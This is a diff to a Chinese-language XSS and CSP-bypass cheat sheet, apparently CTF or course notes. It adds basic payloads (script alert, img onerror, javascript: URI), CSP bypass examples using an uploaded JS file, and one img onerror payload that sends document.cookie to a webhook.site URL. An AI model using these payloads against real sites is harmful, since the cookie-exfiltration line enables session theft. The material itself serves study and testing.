@@ -182,7 +182,11 @@ Ask:
 
 ## 基础payload
 ```HTML
-
+<h1>a</h1>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror="fetch('https://webhook.site/81d73791-1083-421a-9a54-2d49b0bc6bd7?flag='+document.cookie)">
+javascript:alert(1)
 ```
 
 
@@ -207,16 +211,9 @@ Bypass payloads:
 | ------------ | -------------- | ---------- |
 | `script-src` | `self`            | ` <script src="/app.js"></script>`                                                                                |
 |              | `'unsafe-inline'` | 1、`<script>alert(1)</script>`<br>2、`<img src=x onerror=alert(1)>` <br>3、`<button onclick=alert(1)>Click</button>` |
-- 可以上传自己的js文件
-- 可以用img onerror
+- 可以上传自己的js文件 `<script src="/profileimage/zid.js" />`
+- 可以用img onerror `<img src=x onerror=alert(1)/>`
 
-```
-<script src="/profileimage/z5723016.js" />
-```
-
-```
-<img src=x onerror=alert(1)/>
-```
 
 
 ## NO-CORS
